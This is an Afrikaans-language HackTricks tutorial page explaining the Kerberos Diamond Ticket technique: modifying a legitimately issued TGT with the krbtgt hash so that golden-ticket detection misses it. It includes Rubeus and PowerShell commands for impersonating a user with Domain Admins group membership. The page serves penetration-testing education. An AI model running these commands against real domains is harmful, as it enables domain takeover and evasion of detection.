# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Soos 'n goue kaart**, is 'n diamant kaart 'n TGT wat gebruik kan word om **enige diens as enige gebruiker** te **toegang**. 'n Goue kaart word heeltemal buitelyn gesmee, versleuteld met die krbtgt-hash van daardie domein, en dan in 'n aanmeldsessie oorhandig vir gebruik. Omdat domeinbeheerders nie TGT's volg wat dit (of hulle) wettiglik uitgereik het nie, sal hulle graag TGT's aanvaar wat met sy eie krbtgt-hash versleuteld is.

Daar is twee algemene tegnieke om die gebruik van goue kaarte te detecteer:

- Soek na TGS-REQs wat geen ooreenstemmende AS-REQ het nie.
- Soek na TGT's wat dom waardes het, soos Mimikatz se standaard 10-jaar lewensduur.

'n **Diamant kaart** word gemaak deur **die velde van 'n wettige TGT wat deur 'n DC uitgereik is, te wysig**. Dit word bereik deur **'n TGT aan te vra**, dit **te ontsleutel** met die domein se krbtgt-hash, die gewenste velde van die kaart te **wysig**, en dit dan **weer te versleutel**. Dit **oorkom die twee bogenoemde tekortkominge** van 'n goue kaart omdat:

- TGS-REQs 'n voorafgaande AS-REQ sal hê.
- Die TGT is deur 'n DC uitgereik wat beteken dit sal al die korrekte besonderhede van die domein se Kerberos-beleid hê. Alhoewel hierdie akkuraat in 'n goue kaart gesmee kan word, is dit meer kompleks en geneig tot foute.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
